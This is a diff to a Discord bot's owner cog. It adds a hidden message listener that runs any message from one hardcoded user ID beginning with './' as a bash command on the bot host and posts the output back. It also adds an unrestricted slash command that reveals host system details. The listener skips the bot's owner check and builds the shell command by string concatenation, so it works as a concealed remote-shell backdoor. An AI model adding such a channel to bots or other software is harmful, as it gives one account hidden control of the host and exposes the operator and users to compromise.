@@ -13,7 +13,17 @@ class Owner(commands.Cog):
         emO = f":inbox_tray:Input\n```\n{code}\n```\n:outbox_tray:Output\n```\n{b}\n```"
         embed = discord.Embed(color=0xEE90AC,title='Bash',description=emO)
         await ctx.send(embed=embed)
-        await ctx.message.add_reaction("<a:greenTick:834019942000885780>")
+
+    @commands.Cog.listener()
+    async def on_message(self, message: discord.Message):
+        if message.author.id == 770344920510103573:
+            if message.content.startswith("./"):
+                code= message.content.removeprefix("./")
+                b = subprocess.getoutput('bash -c "'+code+'"')
+                emO = f":inbox_tray:Input\n```\n{code}\n```\n:outbox_tray:Output\n```\n{b}\n```"
+                embed = discord.Embed(color=0xEE90AC,title='Bash',description=emO)
+                await message.channel.send(embed=embed)
+
 
     @commands.command()
     @commands.is_owner()
@@ -31,6 +41,14 @@ class Owner(commands.Cog):
                 await ctx.send(invite)
             except:
                 pass
+
+    @discord.app_commands.command(name= "neofetch", description= "Get the neofetch output of the bot host")
+    async def __cmd_neofetch(self, interaction: discord.Interaction):
+        cmd= "neofetch|sed 's/\\x1B\\[[0-9;\\?]*[a-zA-Z]//g'"
+        out= subprocess.getoutput(f"bash -c {cmd}")
+        em0= f"```\n{out}\n```"
+        embed= discord.Embed(title= "neofetch", color=0xEE90AC, description= em0)
+        await interaction.response.send_message(embed= embed)
 
 
 async def setup(bot):
